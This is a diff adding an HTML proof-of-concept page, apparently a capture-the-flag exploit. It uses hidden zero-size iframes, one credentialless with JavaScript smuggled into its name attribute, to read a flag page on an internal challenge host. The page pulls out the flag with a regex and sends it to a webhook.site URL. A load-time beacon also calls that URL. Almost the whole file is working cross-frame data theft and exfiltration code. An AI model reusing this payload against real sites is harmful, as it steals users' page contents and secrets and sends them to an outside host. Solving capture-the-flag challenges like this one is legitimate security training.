@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe 
+    name="setTimeout(() => { 
+        const regularIframe = window.top.frames[1]; 
+        if (regularIframe) { 
+            const flagHtml = regularIframe.document.body.innerHTML; 
+            const flag = flagHtml.match(/flag\{[A-Za-z0-9_]+\}/)[0]; 
+            fetch('https://webhook.site/2c4cfcf4-ea51-4319-8e4d-6a9fcca90649?flag=' + encodeURIComponent(flag || 'no-flag-found')); 
+        } else {
+            fetch('https://webhook.site/2c4cfcf4-ea51-4319-8e4d-6a9fcca90649?error=no-regular-iframe');
+        }
+    }, 3000);"  
+    src="https://valderyaya.github.io/csrf-login.html" 
+    credentialless 
+    width="0" 
+    height="0">
+</iframe>
+<iframe src="http://web:11202/flag" width="0" height="0"></iframe>
+<script>
+window.addEventListener('load', () => {
+    fetch('https://webhook.site/2c4cfcf4-ea51-4319-8e4d-6a9fcca90649?status=poc-loaded');
+});
+</script>
+</body>
+</html>
